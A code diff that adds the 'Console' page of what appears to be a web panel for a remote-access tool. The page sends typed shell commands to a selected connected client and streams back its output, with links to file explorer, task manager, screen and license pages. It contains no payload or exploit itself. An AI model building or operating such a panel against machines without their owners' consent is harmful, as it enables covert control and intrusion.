@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<title>Connections</title>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="icon" href="https://i.imgur.com/CsVKESW.jpg">
+	<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+	<style type="text/css">
+		th {
+			background-color: lightblue;
+		}
+
+		table {
+			border-collapse: collapse;
+			width: 100%;
+		}
+
+		table,
+		th,
+		td {
+			border: 1px solid black;
+		}
+
+		th,
+		td {
+			padding: 10px;
+			text-align: center;
+		}
+
+		tr:hover {
+			background-color: lightgray;
+			cursor: pointer;
+		}
+
+		header-table {
+			position: absolute;
+		}
+
+		.headbtn {
+			padding: 10px 20px;
+			background-color: #007bff;
+			color: #fff;
+			text-decoration: none;
+			border-radius: 5px;
+			margin-left: 4px;
+		}
+
+		.headbtn:hover {
+			background-color: green;
+		}
+
+		.logo {
+			max-width: 100px;
+		}
+
+		body {
+			font-family: "Roboto", sans-serif;
+			background-color: #f7f7f7;
+			padding: 20px;
+		}
+
+		.title {
+			text-align: center;
+			flex-grow: 1;
+		}
+
+		.header {
+			display: flex;
+			justify-content: space-between;
+			align-items: center;
+			padding: 20px;
+		}
+
+		#console {
+			max-height: 400px;
+			height: 400px;
+			overflow: auto;
+			background-color: black;
+			color: white;
+			font-family: monospace;
+			padding: 10px;
+		}
+
+		#commandInput {
+			padding: 10px;
+			font-size: 16px;
+			border: 2px solid #333;
+			border-radius: 5px;
+			width: 89%;
+			margin-right: 10px;
+			float: left;
+		}
+
+		#commandInput::placeholder {
+			color: #999;
+		}
+
+		#execbtn {
+			float: right;
+			padding: 10px 15px;
+			font-size: 16px;
+			background-color: #007bff;
+			color: white;
+			border: none;
+			border-radius: 5px;
+			cursor: pointer;
+		}
+
+		#execbtn:hover {
+			background-color: #0056b3;
+		}
+	</style>
+</head>
+
+<body>
+	<div class="header">
+		<img src="https://i.imgur.com/CsVKESW.jpg" alt="Lgo" class="logo">
+		<h1 class="title">Console</h1>
+		<a href="connections?" class="headbtn">Connections</a>
+		<a href="explorer?" class="headbtn">Explorer</a>
+		<a href="taskmgr?" class="headbtn">Taskmgr</a>
+		<a href="screen?" class="headbtn">Screen</a>
+		<a href="license?" class="headbtn">License</a>
+	</div>
+	<pre id="console"></pre>
+	<div>
+		<input type="text" id="commandInput" placeholder="Enter command...">
+		<button id="execbtn">Execute</button>
+	</div>
+	<br>
+	<p></p>
+</body>
+<script>
+	const socket = window.location.href.split("?socket=")[1];
+	setInterval(updateConsole, 1000);
+	setInterval(updateLinks, 100);
+	document.getElementById("execbtn").addEventListener("click", function () {
+		var cmd = document.getElementById("commandInput").value;
+		let url = "/api/cmd?socket=" + socket + "&command=" + cmd;
+		fetch(url)
+			.then(response => response.json())
+			.then((data) => {
+				Swal.fire("Command sent. Answer:" + JSON.stringify(data), "", "success");
+				document.getElementById("commandInput").value="";
+			})
+			.catch(error => {
+				Swal.fire("Error: " + error.toString(), "", "error");
+			});
+	});
+
+	function updateConsole() {
+		let url = "/api/console?socket=" + socket;
+		fetch(url)
+			.then(response => response.json())
+			.then((data) => {
+				const inputString = data["message"];
+				const lines = inputString.split("\n");
+				const consoleOutput = document.getElementById("console");
+				consoleOutput.textContent = "";
+				lines.forEach(function (line) {
+					consoleOutput.textContent += line + "\n";
+				});
+			})
+			.catch(error => {
+				Swal.fire("Error: " + error.toString(), "", "error");
+			});
+	}
+	function updateLinks() {
+		let linkElements = document.querySelectorAll(".headbtn");
+		linkElements.forEach((linkElement) => {
+			let currentHref = linkElement.getAttribute("href");
+			let newUrl = currentHref.split("?")[0];
+			linkElement.setAttribute("href", newUrl + "?socket=" + socket);
+		});
+	}
+</script>
+
+</html>
